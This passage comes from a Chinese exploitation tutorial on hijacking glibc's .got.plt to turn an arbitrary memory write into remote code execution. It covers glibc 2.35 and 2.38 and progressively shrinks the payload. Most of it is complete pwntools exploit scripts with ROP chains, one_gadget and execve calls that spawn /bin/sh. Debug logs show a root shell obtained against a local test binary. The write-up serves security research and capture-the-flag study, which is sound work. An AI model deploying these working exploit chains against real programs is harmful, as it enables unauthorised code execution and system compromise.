libc = elf.libc
cn = process('./main')

def tobytes(x): return x.encode('latin1') if isinstance(x, str) else x
def sd(x): return cn.send(tobytes(x))
def sl(x): return cn.sendline(tobytes(x))
def sa(a, b): return cn.sendafter(tobytes(a), tobytes(b))
def sla(a, b): return cn.sendlineafter(tobytes(a), tobytes(b))
def rv(x=0x1000): return cn.recv(x)
def rl(): return cn.recvline()
def ru(x): return cn.recvuntil(tobytes(x))
def raddr(): return u64(cn.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
def raddrn(x): return u64(rv(x).ljust(8, b'\x00'))
def interact(): return cn.interactive()
def ss(s): return success(s)


def logsym(val):
    for line in inspect.getframeinfo(inspect.currentframe().f_back)[3]:
        m = re.search(r'\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)', line)
    if m:
        varname = m.group(1)
        ss(f"{varname} => {hex(val)}")
    else:
        ss(hex(val))


############################################

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


class ROPgadget:
    def __init__(self, libc: ELF, base=0):
        if Path("./gadgets").exists():
            print(
                "[!] Using gadgets, make sure that's corresponding to the libc!")
        else:
            fp = open("./gadgets", 'wb')
            subprocess.run(f"ROPgadget --binary {libc.path}".split(" "),
                           stdout=fp)
            fp.close()
        fp = open("./gadgets", 'rb')
        data = fp.readlines()[2:-2]
        data = [x.strip().split(b" : ") for x in data]
        data = [[int(x[0], 16), x[1].decode()] for x in data]
        fp.close()
        self.gadgets = data
        self.base = base

    def search(self, s):
        for addr, ctx in self.gadgets:
            if ctx == s:
                return addr + self.base
        return None


def fix2_create(libc: ELF, rop_chain, nudge=0):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    rop2 = ROPgadget(libc, libc.address)
    pivot = rop.find_gadget(["pop rsp", 'ret'])[0]
    escape = rop2.search(r"pop rsp ; jmp rax")
    if not escape:
        raise Exception("can't find escape gadget")
    write_dest = got + 8
    got_count = 0x15  # hardcoded point overwrite strchrnul to plt[0]
    rop_dest = write_dest + 0x10 + got_count * 8

    rop_chain2 = flat(
        rop_chain,
        escape,
        got + 0x3000 - nudge * 8,  # new rsp
    )
    write_data = flat(
        rop_dest,
        pivot,
        [plt0] * got_count,
        rop_chain2
    )
    return write_dest, write_data


leak = int(rl(), 16)
logsym(leak)
lbase = leak - libc.sym['printf']
logsym(lbase)
libc.address = lbase

rop = ROP(libc)
rdi = rop.find_gadget(["pop rdi", 'ret'])[0]
rax = rop.find_gadget(["pop rax", 'ret'])[0]
rop_chain = flat(
    rdi, libc.search(b"/bin/sh").__next__(),
    rax, libc.sym["system"]
)
dest, payload = fix2_create(libc, rop_chain=rop_chain, nudge=1)

ss("write payload to {}, length {}".format(hex(dest), hex(len(payload))))
# attach(cn)
sd(p64(dest))
sd(p64(len(payload)))
sd(payload)

interact()
```

```bash
[+] leak => 0x7f6ee16666f0
[+] lbase => 0x7f6ee1606000
[*] Loaded 220 cached gadgets for '/root/glibc-all-in-one/libs/2.35-0ubuntu3.5_amd64/libc.so.6'
[!] Using gadgets, make sure that's corresponding to the libc!
[+] write payload to 0x7f6ee181f008, length 0xe8
[DEBUG] Sent 0x8 bytes:
    00000000  08 f0 81 e1  6e 7f 00 00                            │····│n···│
    00000008
[DEBUG] Sent 0x8 bytes:
    00000000  e8 00 00 00  00 00 00 00                            │····│····│
    00000008
[DEBUG] Sent 0xe8 bytes:
    00000000  c0 f0 81 e1  6e 7f 00 00  32 b7 63 e1  6e 7f 00 00  │····│n···│2·c·│n···│
    00000010  00 e0 62 e1  6e 7f 00 00  00 e0 62 e1  6e 7f 00 00  │··b·│n···│··b·│n···│
    *
    000000b0  00 e0 62 e1  6e 7f 00 00  e5 03 63 e1  6e 7f 00 00  │··b·│n···│··c·│n···│
    000000c0  78 e6 7d e1  6e 7f 00 00  b0 be 64 e1  6e 7f 00 00  │x·}·│n···│··d·│n···│
    000000d0  70 6d 65 e1  6e 7f 00 00  f8 98 68 e1  6e 7f 00 00  │pme·│n···│··h·│n···│
    000000e0  f8 1f 82 e1  6e 7f 00 00                            │····│n···│
    000000e8
[*] Switching to interactive mode
$ id
[DEBUG] Sent 0x3 bytes:
    b'id\n'
[DEBUG] Received 0x27 bytes:
    b'uid=0(root) gid=0(root) groups=0(root)\n'
uid=0(root) gid=0(root) groups=0(root)
$ 
```

payload长度为0xe8 Bytes，还能减少长度吗？请看下文。

## 0x04 fix3-0x70

可以发现，其实我们没必要吧GOT表的每一项填满，之前是减少got_count，来减少payload长度，对于printf的场景，mempcpy.got是最靠前的一个触发点，可以劫持它。其他不影响的GOT表项可以直接用来布置ROP gadget，因此又能大幅缩短payload。

```python
#!/usr/bin/env python3
# coding=utf8
import inspect
from pwn import *

context.log_level = 'debug'

elf = ELF('./main')
libc = elf.libc
cn = process('./main')

def tobytes(x): return x.encode('latin1') if isinstance(x, str) else x
def sd(x): return cn.send(tobytes(x))
def sl(x): return cn.sendline(tobytes(x))
def sa(a, b): return cn.sendafter(tobytes(a), tobytes(b))
def sla(a, b): return cn.sendlineafter(tobytes(a), tobytes(b))
def rv(x=0x1000): return cn.recv(x)
def rl(): return cn.recvline()
def ru(x): return cn.recvuntil(tobytes(x))
def raddr(): return u64(cn.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
def raddrn(x): return u64(rv(x).ljust(8, b'\x00'))
def interact(): return cn.interactive()
def ss(s): return success(s)


def logsym(val):
    for line in inspect.getframeinfo(inspect.currentframe().f_back)[3]:
        m = re.search(r'\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)', line)
    if m:
        varname = m.group(1)
        ss(f"{varname} => {hex(val)}")
    else:
        ss(hex(val))


############################################

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

def fix3_create(libc: ELF, slot, rop_chain):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr

    pivot = libc.address + 0x0000000000035732  # pop rsp; ret
    escape = libc.address + 0x00000000000838f8  # pop rsp; jmp rax

    write_dest = got + 8
    rop_chain2 = flat(rop_chain, escape, got + 0x3000 - 8)
    trampoline_offset = slot * 8 - (write_dest - got)
    rop_offset = 0x10
    if len(rop_chain2) > trampoline_offset - 0x10:
        rop_offset = trampoline_offset + 8
    info("rop offset: 0x{:x}".format(rop_offset))
    write_data = flat({
        0x00: write_dest + rop_offset,
        0x08: pivot,
        rop_offset: rop_chain2,
        trampoline_offset: plt0,
    }, word_size=64)

    return write_dest, write_data


leak = int(rl(), 16)
logsym(leak)
lbase = leak - libc.sym['printf']
logsym(lbase)
libc.address = lbase

got = lbase + libc.dynamic_value_by_tag("DT_PLTGOT")
strchrnul_got = lbase + 0x2190B8
mempcpy_got = lbase + 0x219040
prdi = lbase + 0x000000000002a3e5  # pop rdi; ret
prax = lbase + 0x0000000000045eb0  # pop rax; ret

rop_chain = flat(
    prdi, libc.search(b"/bin/sh").__next__(),
    prax, libc.sym["system"]
)
dest, payload = fix3_create(libc, slot=(mempcpy_got - got) // 8, rop_chain=rop_chain)

ss("write payload to {}, length {}".format(hex(dest), hex(len(payload))))
# attach(cn)
sd(p64(dest))
sd(p64(len(payload)))
sd(payload)

interact()
```

```bash
[+] leak => 0x7fe2516f76f0
[+] lbase => 0x7fe251697000
[*] rop offset: 0x40
[+] write payload to 0x7fe2518b0008, length 0x70
[DEBUG] Sent 0x8 bytes:
    00000000  08 00 8b 51  e2 7f 00 00                            │···Q│····│
    00000008
[DEBUG] Sent 0x8 bytes:
    00000000  70 00 00 00  00 00 00 00                            │p···│····│
    00000008
[DEBUG] Sent 0x70 bytes:
    00000000  48 00 8b 51  e2 7f 00 00  32 c7 6c 51  e2 7f 00 00  │H··Q│····│2·lQ│····│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
    00000030  6d 61 61 61  6e 61 61 61  00 f0 6b 51  e2 7f 00 00  │maaa│naaa│··kQ│····│
    00000040  e5 13 6c 51  e2 7f 00 00  78 f6 86 51  e2 7f 00 00  │··lQ│····│x··Q│····│
    00000050  b0 ce 6d 51  e2 7f 00 00  70 7d 6e 51  e2 7f 00 00  │··mQ│····│p}nQ│····│
    00000060  f8 a8 71 51  e2 7f 00 00  f8 2f 8b 51  e2 7f 00 00  │··qQ│····│·/·Q│····│
    00000070
[*] Switching to interactive mode
$ id
[DEBUG] Sent 0x3 bytes:
    b'id\n'
[DEBUG] Received 0x27 bytes:
    b'uid=0(root) gid=0(root) groups=0(root)\n'
uid=0(root) gid=0(root) groups=0(root)
$  
```
payload长度为0x70 Bytes，还能再减小点吗？请看下文。

## 0x05 fix4-0x50

注意到fix3中GOT表前面有0x28 bytes的buffer没有利用起来，其实稍微构造一下也是能用来缩短payload的。

我们的rop chain其实只有0x20字节，塞进去还有8字节空余，放一个`pop rxx; ret`就能刚好跳过触发点，在触发点后再放第二个栈迁移gadget即可。

完整exp如下：

```python
#!/usr/bin/env python3
# coding=utf8
import inspect
from pwn import *

context.log_level = 'debug'

elf = ELF('./main')
libc = elf.libc
cn = process('./main')

def tobytes(x): return x.encode('latin1') if isinstance(x, str) else x
def sd(x): return cn.send(tobytes(x))
def sl(x): return cn.sendline(tobytes(x))
def sa(a, b): return cn.sendafter(tobytes(a), tobytes(b))
def sla(a, b): return cn.sendlineafter(tobytes(a), tobytes(b))
def rv(x=0x1000): return cn.recv(x)
def rl(): return cn.recvline()
def ru(x): return cn.recvuntil(tobytes(x))
def raddr(): return u64(cn.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
def raddrn(x): return u64(rv(x).ljust(8, b'\x00'))
def interact(): return cn.interactive()
def ss(s): return success(s)


def logsym(val):
    for line in inspect.getframeinfo(inspect.currentframe().f_back)[3]:
        m = re.search(r'\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)', line)
    if m:
        varname = m.group(1)
        ss(f"{varname} => {hex(val)}")
    else:
        ss(hex(val))


############################################

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

def fix4_create(libc: ELF, slot, rop_chain):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr

    pivot = libc.address + 0x0000000000035732  # pop rsp; ret
    escape = libc.address + 0x00000000000838f8  # pop rsp; jmp rax
    pr15 = libc.address + 0x000000000002a3e4  # pop r15; ret
    ret = libc.address + 0x000000000002be52  # ret

    write_dest = got + 8
    trampoline_offset = slot * 8 - (write_dest - got)
    rop_offset = 0x10
    assert len(rop_chain) <= trampoline_offset - 0x10 - 8, "use fix3 instead"
    info("rop offset: 0x{:x}".format(rop_offset))
    write_data = flat({
        0x00: write_dest + rop_offset,
        0x08: pivot,
        rop_offset: rop_chain,
        trampoline_offset - 8: pr15,
        trampoline_offset: plt0,
        trampoline_offset + 8: [escape, got + 0x3000 - 8]
    }, filler=p64(ret), word_size=64)

    return write_dest, write_data


leak = int(rl(), 16)
logsym(leak)
lbase = leak - libc.sym['printf']
logsym(lbase)
libc.address = lbase

got = lbase + libc.dynamic_value_by_tag("DT_PLTGOT")
mempcpy_got = lbase + 0x219040
got_slot = (mempcpy_got - got) // 8

prdi = lbase + 0x000000000002a3e5  # pop rdi; ret
prax = lbase + 0x0000000000045eb0  # pop rax; ret

rop_chain = flat(
    prdi, libc.search(b"/bin/sh").__next__(),
    prax, libc.sym["system"]
)
dest, payload = fix4_create(libc, slot=(mempcpy_got - got) // 8, rop_chain=rop_chain)

ss("write payload to {}, length {}".format(hex(dest), hex(len(payload))))
# attach(cn)
sd(p64(dest))
sd(p64(len(payload)))
sd(payload)

interact()
```

```bash
[+] leak => 0x7f5757e186f0
[+] lbase => 0x7f5757db8000
[*] rop offset: 0x10
[+] write payload to 0x7f5757fd1008, length 0x50
[DEBUG] Sent 0x8 bytes:
    00000000  08 10 fd 57  57 7f 00 00                            │···W│W···│
    00000008
[DEBUG] Sent 0x8 bytes:
    00000000  50 00 00 00  00 00 00 00                            │P···│····│
    00000008
[DEBUG] Sent 0x50 bytes:
    00000000  18 10 fd 57  57 7f 00 00  32 d7 de 57  57 7f 00 00  │···W│W···│2··W│W···│
    00000010  e5 23 de 57  57 7f 00 00  78 06 f9 57  57 7f 00 00  │·#·W│W···│x··W│W···│
    00000020  b0 de df 57  57 7f 00 00  70 8d e0 57  57 7f 00 00  │···W│W···│p··W│W···│
    00000030  e4 23 de 57  57 7f 00 00  00 00 de 57  57 7f 00 00  │·#·W│W···│···W│W···│
    00000040  f8 b8 e3 57  57 7f 00 00  f8 3f fd 57  57 7f 00 00  │···W│W···│·?·W│W···│
    00000050
[*] Switching to interactive mode
$  
```

payload为0x50字节，还能再小吗？请看下文。

## 0x06 fix5-0x40

如果说还有哪里能用来缩短payload，那大概就是rop chain本身了。在fix4中我们使用了0x20 bytes去调用system。这次我们尝试直接调用one_gadget。

在one_gadget的结果中有如下一条，似乎只要让rsp指向一片空内存即可，这配合我们的栈迁移gadget简直刚好。

```bash
0x10d7d2 posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, [rsp+0xf0])
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
  [[rsp+0xf0]] == NULL || [rsp+0xf0] == NULL || [rsp+0xf0] is a valid envp
  [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0

```

但如果我们带着下面的三个跑到这个onegadget，会发现虽然貌似execve成功了，但程序还是crash了

```bash
[rsp+0x70] == NULL
[rsp+0xf0] == NULL
[rsp+0x40] == NULL
```

经过调试发现[rsp+0x40]的值不能为0，可能是one_gadget的bug吧，调整rsp位置使其满足：

```bash
[rsp+0x70] == NULL
[rsp+0xf0] == NULL
[rsp+0x40] != NULL
```

执行成功。

完整exp：

```python

#!/usr/bin/env python3
# coding=utf8
import inspect
from pwn import *

context.log_level = 'debug'

elf = ELF('./main')
libc = elf.libc
cn = process('./main')

def tobytes(x): return x.encode('latin1') if isinstance(x, str) else x
def sd(x): return cn.send(tobytes(x))
def sl(x): return cn.sendline(tobytes(x))
def sa(a, b): return cn.sendafter(tobytes(a), tobytes(b))
def sla(a, b): return cn.sendlineafter(tobytes(a), tobytes(b))
def rv(x=0x1000): return cn.recv(x)
def rl(): return cn.recvline()
def ru(x): return cn.recvuntil(tobytes(x))
def raddr(): return u64(cn.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
def raddrn(x): return u64(rv(x).ljust(8, b'\x00'))
def interact(): return cn.interactive()
def ss(s): return success(s)


def logsym(val):
    for line in inspect.getframeinfo(inspect.currentframe().f_back)[3]:
        m = re.search(r'\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)', line)
    if m:
        varname = m.group(1)
        ss(f"{varname} => {hex(val)}")
    else:
        ss(hex(val))


############################################

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

def fix5_create(libc: ELF, slot, rop_chain):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr

    pivot = libc.address + 0x0000000000035732  # pop rsp; ret
    escape = libc.address + 0x00000000000838f8  # pop rsp; jmp rax

    # let [rsp+0x40] != NULL ??
    # [rsp+0x70] == NULL
    # [rsp + 0xf0] == NULL
    zero_buf = libc.address + 0x21a870 - 0x40

    write_dest = got + 8
    trampoline_offset = slot * 8 - (write_dest - got)
    rop_chain2 = [rop_chain, escape, zero_buf]
    rop_offset = 0x10
    assert len(rop_chain) <= trampoline_offset - 0x10 - 8, "use fix3 instead"
    info("rop offset: 0x{:x}".format(rop_offset))
    write_data = flat({
        0x00: write_dest + rop_offset,
        0x08: pivot,
        rop_offset: rop_chain2,
        trampoline_offset: plt0,
    }, word_size=64)

    return write_dest, write_data


leak = int(rl(), 16)
logsym(leak)
lbase = leak - libc.sym['printf']
logsym(lbase)
libc.address = lbase

got = lbase + libc.dynamic_value_by_tag("DT_PLTGOT")
mempcpy_got = lbase + 0x219040
got_slot = (mempcpy_got - got) // 8

'''
0x10d7d2 posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, [rsp+0xf0])
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
  [[rsp+0xf0]] == NULL || [rsp+0xf0] == NULL || [rsp+0xf0] is a valid envp
  [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0
'''

one_gadget = lbase + 0x10d7d2
prax = lbase + 0x0000000000045eb0  # pop rax; ret

rop_chain = flat(prax, one_gadget)
dest, payload = fix5_create(libc, slot=(mempcpy_got - got) // 8, rop_chain=rop_chain)

ss("write payload to {}, length {}".format(hex(dest), hex(len(payload))))
# attach(cn)
sd(p64(dest))
sd(p64(len(payload)))
sd(payload)

interact()
```

```bash
[+] leak => 0x7f347554f6f0
[+] lbase => 0x7f34754ef000
[*] rop offset: 0x10
[+] write payload to 0x7f3475708008, length 0x40
[DEBUG] Sent 0x8 bytes:
    00000000  08 80 70 75  34 7f 00 00                            │··pu│4···│
    00000008
[DEBUG] Sent 0x8 bytes:
    00000000  40 00 00 00  00 00 00 00                            │@···│····│
    00000008
[DEBUG] Sent 0x40 bytes:
    00000000  18 80 70 75  34 7f 00 00  32 47 52 75  34 7f 00 00  │··pu│4···│2GRu│4···│
    00000010  b0 4e 53 75  34 7f 00 00  d2 c7 5f 75  34 7f 00 00  │·NSu│4···│··_u│4···│
    00000020  f8 28 57 75  34 7f 00 00  30 98 70 75  34 7f 00 00  │·(Wu│4···│0·pu│4···│
    00000030  6d 61 61 61  6e 61 61 61  00 70 51 75  34 7f 00 00  │maaa│naaa│·pQu│4···│
    00000040
[*] Switching to interactive mode
$ id
[DEBUG] Sent 0x3 bytes:
    b'id\n'
[DEBUG] Received 0x27 bytes:
    b'uid=0(root) gid=0(root) groups=0(root)\n'
uid=0(root) gid=0(root) groups=0(root)
```

payload长度0x40 Bytes，应该是极限了吧。

## 0x07 one_punch

这一切在glibc 2.35上都很美好，直到来到了glibc 2.36。从2.36开始GOT0就不可写了，但依然可以修改GOT表下面的每一项：

```bash
pwndbg> tel 0x7ffff7faf000-0x18
00:0000│  0x7ffff7faefe8 ◂— 0x1fdb80
01:0008│  0x7ffff7faeff0 —▸ 0x7ffff7fbe2f0 —▸ 0x7ffff7db1000 ◂— 0x3010102464c457f
02:0010│  0x7ffff7faeff8 —▸ 0x7ffff7fdae90 ◂— endbr64 
03:0018│  0x7ffff7faf000 (*ABS*@got.plt) —▸ 0x7ffff7f32ea0 ◂— endbr64 
04:0020│  0x7ffff7faf008 (realloc@got[plt]) —▸ 0x7ffff7dd7020 ◂— endbr64 
05:0028│  0x7ffff7faf010 (*ABS*@got.plt) —▸ 0x7ffff7f31440 ◂— endbr64 
06:0030│  0x7ffff7faf018 (*ABS*@got.plt) —▸ 0x7ffff7f2e540 ◂— endbr64 
07:0038│  0x7ffff7faf020 (*ABS*@got.plt) —▸ 0x7ffff7e66890 ◂— endbr64 
pwndbg> vmmap 0x7ffff7faeff0
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x7ffff7f56000     0x7ffff7fab000 r--p    55000 1a5000 /root/glibc-all-in-one/libs/2.38-1ubuntu6_amd64/libc.so.6
►   0x7ffff7fab000     0x7ffff7faf000 r--p     4000 1f9000 /root/glibc-all-in-one/libs/2.38-1ubuntu6_amd64/libc.so.6 +0x3ff0
    0x7ffff7faf000     0x7ffff7fb1000 rw-p     2000 1fd000 /root/glibc-all-in-one/libs/2.38-1ubuntu6_amd64/libc.so.6
```

[这里（以下称为大佬）](https://github.com/n132/Libc-GOT-Hijacking/blob/main/Post/README.md)提供了一个只利用.got.plt做ROP的思路，不过我用他的payload没有复现成功，似乎是触发点的偏移和gets函数内部调用依赖有点问题，自己调了一下

这里我们用2.38做实验：

```bash
➜  d1ag0n ✗ md5sum /root/glibc-all-in-one/libs/2.38-1ubuntu6_amd64/libc.so.6
a747f14b74ebf168dac9a97d21429f8d  /root/glibc-all-in-one/libs/2.38-1ubuntu6_amd64/libc.so.6
```

首先，printf会调用到`strchrnul.got`，因此我们从这里劫持RIP是没有疑问的，问题是要改成啥？没有了GOT[0]为我们铺路，该如何破局呢？

大佬巧妙地注意到glibc中有如下代码片段：

```bash
.text:0000000000177D59                 lea     rdi, [rsp+18h]
.text:0000000000177D5E                 mov     edx, 20h ; ' '
.text:0000000000177D63                 call    j_strncpy
```

将rdi设置到rsp附近，rsp+0x18处，然后调用strncpy.got，此时在调用之前我么将strncpy覆盖成如下片段：

```bash
.text:00000000000D60A8                 pop     rbx
.text:00000000000D60A9                 pop     rbp
.text:00000000000D60AA                 pop     r12
.text:00000000000D60AC                 pop     r13
.text:00000000000D60AE                 jmp     j_wmemset_0
```

这样rdi就正好和rsp相等了！然后我们可以将wmemset.got改为gets函数，从而直接在栈上写入ROP gadget。

glibc2.38完整exp如下：

```python
#!/usr/bin/env python3
# coding=utf8
import inspect
from pwn import *
context.log_level = 'debug'

elf = ELF('./main_2.38')
libc = elf.libc
cn = process('./main_2.38')

def tobytes(x): return x.encode('latin1') if isinstance(x, str) else x
def sd(x): return cn.send(tobytes(x))
def sl(x): return cn.sendline(tobytes(x))
def sa(a, b): return cn.sendafter(tobytes(a), tobytes(b))
def sla(a, b): return cn.sendlineafter(tobytes(a), tobytes(b))
def rv(x=0x1000): return cn.recv(x)
def rl(): return cn.recvline()
def ru(x): return cn.recvuntil(tobytes(x))
def raddr(): return u64(cn.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
def raddrn(x): return u64(rv(x).ljust(8, b'\x00'))
def interact(): return cn.interactive()
def ss(s): return success(s)


def logsym(val):
    for line in inspect.getframeinfo(inspect.currentframe().f_back)[3]:
        m = re.search(r'\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)', line)
    if m:
        varname = m.group(1)
        ss(f"{varname} => {hex(val)}")
    else:
        ss(hex(val))


############################################

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

leak = int(rl(), 16)
logsym(leak)
lbase = leak - libc.sym['printf']
logsym(lbase)
libc.address = lbase

'''
.got.plt:00000000001FE078 off_1FE078      dq offset strncpy       ; DATA XREF: j_strncpy+4↑r
.got.plt:00000000001FE080 off_1FE080      dq offset strlen        ; DATA XREF: j_strlen+4↑r
.got.plt:00000000001FE088 off_1FE088      dq offset wcscat        ; DATA XREF: j_wcscat+4↑r
.got.plt:00000000001FE090 off_1FE090      dq offset strcasecmp_l  ; DATA XREF: j_strcasecmp_l+4↑r
.got.plt:00000000001FE098 off_1FE098      dq offset strcpy        ; DATA XREF: j_strcpy+4↑r
.got.plt:00000000001FE0A0 off_1FE0A0      dq offset wcschr        ; DATA XREF: j_wcschr+4↑r
.got.plt:00000000001FE0A8 off_1FE0A8      dq offset _dl_deallocate_tls
.got.plt:00000000001FE0B0 off_1FE0B0      dq offset __tls_get_addr
.got.plt:00000000001FE0B8 off_1FE0B8      dq offset wmemset       ; DATA XREF: j_wmemset_0+4↑r
.got.plt:00000000001FE0C0 off_1FE0C0      dq offset memcmp        ; DATA XREF: j_memcmp+4↑r
.got.plt:00000000001FE0C8 off_1FE0C8      dq offset strchrnul     ; DATA XREF: j_strchrnul+4↑r

# overwrite strchrnul.got with:
.text:0000000000177D59                 lea     rdi, [rsp+18h]
.text:0000000000177D5E                 mov     edx, 20h ; ' '
.text:0000000000177D63                 call    j_strncpy

# overwrite strncpy.got with:
.text:00000000000D60A8                 pop     rbx
.text:00000000000D60A9                 pop     rbp
.text:00000000000D60AA                 pop     r12
.text:00000000000D60AC                 pop     r13
.text:00000000000D60AE                 jmp     j_wmemset_0

# overwrite wmemset.got with `gets`
'''

strchrnul_gadget = lbase + 0x0000000000177D59
strncpy_gadget = lbase + 0x00000000000D60A8
gets_ptr = lbase + 0x0000000000082AE0

write_dest = lbase + 0x00000000001FE078
write_payload = flat(
    strncpy_gadget,
    0xdead0001,
    0xdead0002,
    0xdead0003,
    0xdead0004,
    0xdead0005,
    0xdead0006,
    0xdead0007,
    gets_ptr,
    0xdead0008,
    strchrnul_gadget,
)

prdi = lbase + 0x0000000000028715
binsh = lbase + 0x00000000001C041B
prsi = lbase + 0x000000000002a671
prdx_rbx = lbase + 0x0000000000093359
execve_ptr = lbase + 0x00000000000EAFF0

rop_payload = flat(
    prdi, binsh,
    prsi, 0,
    prdx_rbx, 0, 0,
    execve_ptr,
)

ss("write payload to {}, length {}".format(
    hex(write_dest), hex(len(write_payload))))
sd(p64(write_dest))
sd(p64(len(write_payload)))
sd(write_payload)

# trigger gets(stack), send rop gadget
sleep(0.1)
sl(rop_payload)

interact()


```

在glibc2.35上使用同样的思路，只需要改动相关函数的偏移，同样可以利用成功：

```python
#!/usr/bin/env python3
# coding=utf8
import inspect
from pwn import *
context.log_level = 'debug'

elf = ELF('./main')
libc = elf.libc
cn = process('./main')

def tobytes(x): return x.encode('latin1') if isinstance(x, str) else x
def sd(x): return cn.send(tobytes(x))
def sl(x): return cn.sendline(tobytes(x))
def sa(a, b): return cn.sendafter(tobytes(a), tobytes(b))
def sla(a, b): return cn.sendlineafter(tobytes(a), tobytes(b))
def rv(x=0x1000): return cn.recv(x)
def rl(): return cn.recvline()
def ru(x): return cn.recvuntil(tobytes(x))
def raddr(): return u64(cn.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
def raddrn(x): return u64(rv(x).ljust(8, b'\x00'))
def interact(): return cn.interactive()
def ss(s): return success(s)


def logsym(val):
    for line in inspect.getframeinfo(inspect.currentframe().f_back)[3]:
        m = re.search(r'\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)', line)
    if m:
        varname = m.group(1)
        ss(f"{varname} => {hex(val)}")
    else:
        ss(hex(val))


############################################

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


leak = int(rl(), 16)
logsym(leak)
lbase = leak - libc.sym['printf']
logsym(lbase)
libc.address = lbase

'''
.got.plt:0000000000219090 off_219090      dq offset strncpy       ; DATA XREF: j_strncpy+4↑r
.got.plt:0000000000219090                                         ; Indirect relocation
.got.plt:0000000000219098 off_219098      dq offset strlen        ; DATA XREF: j_strlen+4↑r
.got.plt:0000000000219098                                         ; Indirect relocation
.got.plt:00000000002190A0 off_2190A0      dq offset strcasecmp_l  ; DATA XREF: j_strcasecmp_l+4↑r
.got.plt:00000000002190A0                                         ; Indirect relocation
.got.plt:00000000002190A8 off_2190A8      dq offset strcpy        ; DATA XREF: j_strcpy+4↑r
.got.plt:00000000002190A8                                         ; Indirect relocation
.got.plt:00000000002190B0 off_2190B0      dq offset wcschr        ; DATA XREF: j_wcschr+4↑r
.got.plt:00000000002190B0                                         ; Indirect relocation
.got.plt:00000000002190B8 off_2190B8      dq offset strchrnul     ; DATA XREF: j_strchrnul+4↑r
.got.plt:00000000002190B8                                         ; Indirect relocation
.got.plt:00000000002190C0 off_2190C0      dq offset memrchr       ; DATA XREF: j_memrchr+4↑r
.got.plt:00000000002190C0                                         ; Indirect relocation
.got.plt:00000000002190C8 off_2190C8      dq offset _dl_deallocate_tls
.got.plt:00000000002190C8                                         ; DATA XREF: __dl_deallocate_tls+4↑r
.got.plt:00000000002190D0 off_2190D0      dq offset __tls_get_addr
.got.plt:00000000002190D0                                         ; DATA XREF: ___tls_get_addr+4↑r
.got.plt:00000000002190D8 off_2190D8      dq offset wmemset       ; DATA XREF: j_wmemset_0+4↑r

# overwrite strchrnul.got with:
.text:0000000000173A2E 48 8D 7C 24 18                          lea     rdi, [rsp+11D8h+var_11C0]
.text:0000000000173A33 BA 20 00 00 00                          mov     edx, 20h ; ' '
.text:0000000000173A38 E8 43 4A EB FF                          call    j_strncpy

# overwrite strncpy.got with:
.text:00000000000C5BF8                 pop     rbx
.text:00000000000C5BF9                 pop     rbp
.text:00000000000C5BFA                 pop     r12
.text:00000000000C5BFC                 pop     r13
.text:00000000000C5BFE                 jmp     j_wmemset_0

# overwrite wmemset.got with `gets`
'''

strchrnul_gadget = lbase + 0x0000000000173A2E
strncpy_gadget = lbase + 0x00000000000C5BF8
gets_ptr = lbase + 0x0000000000080520

write_dest = lbase + 0x0000000000219090
write_payload = flat(
    strncpy_gadget,
    0xdead0001,
    0xdead0002,
    0xdead0003,
    0xdead0004,
    strchrnul_gadget,
    0xdead0005,
    0xdead0006,
    0xdead0007,
    gets_ptr,
)

prdi = lbase + 0x000000000002a3e5
binsh = lbase + 0x00000000001D8678
prsi = lbase + 0x000000000002be51
prdx = lbase + 0x00000000000796a2
execve_ptr = lbase + 0x00000000000EB080

rop_payload = flat(
    prdi, binsh,
    prsi, 0,
    prdx, 0,
    execve_ptr,
)

ss("write payload to {}, length {}".format(
    hex(write_dest), hex(len(write_payload))))
attach(cn)
sd(p64(write_dest))
sd(p64(len(write_payload)))
sd(write_payload)

# trigger gets(stack), send rop gadget
sleep(0.1)
sl(rop_payload)

interact()
```

## 总结

对于高版本的glibc来说，2.35可以选择fix0-fix5任何一种方法实现任意地址写转换成rce；
